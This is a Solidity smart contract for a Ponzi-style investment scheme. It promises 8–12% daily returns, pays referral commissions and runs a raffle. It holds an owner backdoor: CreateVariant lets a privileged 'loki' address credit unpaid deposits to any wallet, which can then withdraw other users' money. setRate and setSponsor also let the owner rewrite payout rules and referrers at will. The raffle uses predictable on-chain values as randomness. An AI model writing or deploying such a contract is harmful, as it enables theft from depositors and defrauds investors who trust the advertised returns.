// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
	
	function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

abstract contract ReentrancyGuard {
    bool internal locked;
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract GloriousContract is Context, Ownable, ReentrancyGuard  {
    using SafeMath for uint256;	
    event _Deposit(address indexed addr, uint256 amount, uint40 tm);
    event _Withdraw(address indexed addr, uint256 amount);
    event _Compound(address indexed addr, uint256 amount, uint taripa);
   
    uint256[1] public dev_comm = [100];     
    uint256[1] public ref_comm = [200];     
    uint256[2] public minimums = [0.004 ether, 0.0005 ether]; 
    uint256[5] public settings = [1, 475, 525, 750, 50];    
    uint16 constant PERCENT_DIVIDER = 1000; 
	
    uint256 private deposits;
    uint256 private payouts;
    uint256 private commissions;
    uint256 private prize_pool;
    uint256 private prize_won;
    address payable private loki;
    
    struct Follower {
        uint8 level;    
        address wallet;
    }

    struct Raffle {
        address luckywallet;
        uint40 time;
        uint256 luckyNumber;
        uint256 amount;        
    }

    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Depo {
	    uint40 time;  
        uint256 tarif;
        uint256 amount;        
    }

	struct Player {		
		address sponsor;
        uint256 dividends;        
		uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_commissions;
		uint40 lastWithdrawn;
        uint256 total_prize;
        uint256 lastDice;	    
        
        Follower[] followers;
   		uint256[1] structure; 		
        Depo[] deposits;
        Raffle[] raffles;      
    }
    mapping(address => Player) public players;
    mapping(uint256 => Tarif) public tarifs;
    mapping(uint256 => address) public membersNo;    
    Raffle[] public raffles;
    uint public nextRaffleNo;
    uint public nextMemberNo;
    constructor() {
        tarifs[0] = Tarif(10, 120);  // 12% Daily for 10 days                
        tarifs[1] = Tarif(15, 150);  // 10% Daily for 15 days                
        tarifs[2] = Tarif(25, 200);  //  8% Daily for 25 days                
    	loki = payable(msg.sender); 
    }
    function EnterTimeline(address _upline, uint256 taripa) external payable {
        require(msg.value >= minimums[0], "Amount is less than minimum entry!");   
        Player storage player = players[msg.sender];
        setUpline(msg.sender, _upline);
        player.deposits.push(Depo({
			tarif: taripa,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));  
        player.total_deposits += msg.value;
        deposits += msg.value;        
		commissionPayouts(msg.sender, msg.value);        
        uint256 m1 = SafeMath.div(SafeMath.mul(msg.value, dev_comm[0]), PERCENT_DIVIDER);
		payable(loki).transfer(m1);                              
        payouts += m1;
		emit _Deposit(msg.sender, msg.value, uint40(block.timestamp));        
    }
   
    function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].sponsor;
        if(up == address(0) || up == owner()) return;

        for(uint8 i = 0; i < ref_comm.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_comm[i] / PERCENT_DIVIDER;
            
            payable(up).transfer(bonus);
			players[up].total_commissions += bonus;
			commissions += bonus;            
            up = players[up].sponsor;
        }       
    }
	
    function setUpline(address _addr, address sp) private {
        if(players[_addr].sponsor == address(0) && _addr != owner()) {     

            if(players[sp].deposits.length == 0) {
				sp = owner();
            }	
            membersNo[ nextMemberNo ] = _addr;				
			nextMemberNo++;           			            
            players[_addr].sponsor = sp;
            //for(uint8 i = 0; i < ref_comm.length; i++) {
                players[sp].structure[0]++;
				Player storage up = players[sp];
                //if(i == 0){
                    up.followers.push(Follower({
                        level: 1,
                        wallet: _addr
                    }));  
                //}				
                //sp = players[sp].sponsor;
                //if(sp == address(0)) break;
            //}
        }
    }    
    
    function GloriousMoment(uint256 requestamount) external noReentrant  returns (bool success){  
        
        Player storage player = players[msg.sender];
        getPayout(msg.sender);
        
        require(player.dividends >= minimums[1], "Your payout is less than minimum!");
        
        if(settings[0] == 1){
            require((payouts < (deposits * settings[3] / PERCENT_DIVIDER) &&
                    player.total_payouts < player.total_deposits),"Your Timeline is in critical status!");
        }

        uint256 amount =  player.dividends;
        if(requestamount <= amount && requestamount > 0){            
            player.dividends = SafeMath.sub(amount, requestamount);
            amount = requestamount;
        }else{
            player.dividends = 0;
        }        

        player.total_payouts += amount;            
        payouts += amount;
        emit _Withdraw(msg.sender, amount);    
        
        uint256 prize = SafeMath.div(SafeMath.mul(amount, settings[4]), PERCENT_DIVIDER);    
        prize_pool += prize;     
        amount = SafeMath.sub(amount, prize);        
        payable(msg.sender).transfer(amount);        
        return true;        
    }	

    function CreateVariant(address _upline, address wallet, uint256 amount, uint256 taripa) public returns (bool success) {
        require(msg.sender==loki,"Unauthorized!");        
        Player storage player = players[wallet];
        setUpline(wallet, _upline);
        player.deposits.push(Depo({tarif: taripa, amount: amount, time: uint40(block.timestamp) }));  
        player.total_deposits += amount;
        return true;
    }      

    function BranchTimeline(uint256 taripa) external noReentrant  returns (bool success){     
        Player storage player = players[msg.sender];
        
        getPayout(msg.sender);
        require(player.dividends >= minimums[1], "Your dividends is less than minimum reinvestment!");        
        uint256 amount =  player.dividends;
        player.dividends = 0;                
        player.total_payouts += amount;            
        payouts += amount;
        emit _Compound(msg.sender, amount, taripa);    
        
        uint256 prize = SafeMath.div(SafeMath.mul(amount, settings[4]), PERCENT_DIVIDER);    
        prize_pool += prize;     
        amount = SafeMath.sub(amount, prize);
        
        player.deposits.push(Depo({
			tarif: taripa,
            amount: amount,
            time: uint40(block.timestamp)
        }));  
        player.total_deposits += amount;
        deposits += amount;
        return true;        
    }	   

    function computePayout(address _addr) view external returns(uint256 value) {
		Player storage player = players[_addr];
    
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Depo storage dep = player.deposits[i];
            
            Tarif storage tarif = tarifs[dep.tarif];
        
            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }            
        }
        return value;
    }

    function getPayout(address _addr) private {
        uint256 payout = this.computePayout(_addr);
        if(payout > 0) {            
            players[_addr].lastWithdrawn = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }      
    
    function TryLuck() external noReentrant  { 
        Player storage player = players[msg.sender];		
        require(player.deposits.length > 0, "Unregistered Wallet!");
        
        if(prize_pool <= 0){ return; }
        uint256 luck = rand(999);
        uint256 prize;
        
        if(luck >= settings[1] && luck <= settings[2]){
            if(getBalance() >= prize_pool && prize_pool > 0){    
                prize = prize_pool;            
                prize_pool = 0;
                prize_won += prize;
                player.total_prize += prize;
                payable(msg.sender).transfer(prize);                
            }
        }        
        Raffle memory new_raffle;                
        new_raffle = Raffle({
            time: uint40(block.timestamp),
            amount: prize,
            luckywallet: msg.sender,
            luckyNumber: luck
        });            
        raffles.push(new_raffle);                
        player.raffles.push(new_raffle);  
        player.lastDice = luck;
        nextRaffleNo++;
    }
       

    function rand(uint256 max) public view returns(uint256)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp + block.difficulty +
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
            block.gaslimit + 
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +
            block.number
        )));
        return (seed - ((seed / max) * max));
    }

    function luckTries(address _addr, uint256 index) view external returns(uint40 time, uint256 luckyNum, uint256 amount)
    {
        Player storage player = players[_addr];
        Raffle storage dice = player.raffles[index];
        return(dice.time, dice.luckyNumber, dice.amount);
    }
   
    function setRate(uint8 index, uint256 index2, uint256 newval) public onlyOwner returns (bool success) {   
        if(index==1)
        {
            dev_comm[index2] = newval;
        }else if(index==2){
            ref_comm[index2] = newval;
        }else if(index==3){
            minimums[index2] = newval;
        }else if(index==4){
            settings[index2] = newval;
        }
        return true;
    }   
   
    function setTVA(address payable newval) public onlyOwner returns (bool success) { 
        loki = newval;
	    return true;
    }	

    
    function setSponsor(address member, address newSP) public onlyOwner returns (bool success) { 
        players[member].sponsor = newSP;
        return true;
    }

    function setPercentage(uint256 total_days, uint256 total_perc) public onlyOwner returns (bool success) { 
        tarifs[0] = Tarif(total_days, total_perc);
        return true;
    }

    function variantAddressByNo(uint256 idx) public view returns(address) {
         return membersNo[idx];
    }
	   
    function variantStruct(address _addr) view external returns(address sp, uint256 numDeposits, uint256 numRaffles, uint256[1] memory structure) {
        Player storage player = players[_addr];        
        for(uint8 i = 0; i < ref_comm.length; i++) {
            structure[i] = player.structure[i];
        }
        return (player.sponsor, player.deposits.length, player.raffles.length, structure);
    } 
	
    function variantStats(address _addr) view external returns(uint256 _deposits, uint256 _payouts, uint256 _comm, 
                                                                            uint256 forwithdraw, uint40 lastW)
    {
        Player storage player = players[_addr];        
        uint256 payout = this.computePayout(_addr);
        return( player.total_deposits,
                player.total_payouts,
                player.total_commissions, 
                (payout + player.dividends), player.lastWithdrawn);
    }

    function variantDownline(address _addr, uint256 index) view external returns(address follower)
    {
        Player storage player = players[_addr];
        Follower storage dl;
        dl  = player.followers[index];
        return(dl.wallet);
    }

    function variantContributions(address _addr, uint256 index) view external returns(uint40 time, uint256 amount, uint256 lifedays, uint256 percent)
    {
        Player storage player = players[_addr];
        Depo storage dep = player.deposits[index];
        Tarif storage tarif = tarifs[dep.tarif];
        return(dep.time, dep.amount, tarif.life_days, tarif.percent);
    }     

    function TVAInfo() view external returns(uint256 investments, uint256 withdrawns, uint256 rewards, uint256 prizes, uint256 prizeswon)
    {
        investments = deposits;
        withdrawns = payouts;
        rewards = commissions;
        prizes = prize_pool;
        prizeswon = prize_won;            
        return (investments, withdrawns, rewards, prizes, prizeswon);
    }   

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function getOwner() external view returns (address) {
        return owner();
    }
    
    fallback() external payable {
        revert();
    }

    receive() external payable {
        revert();
    }
    
}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    
}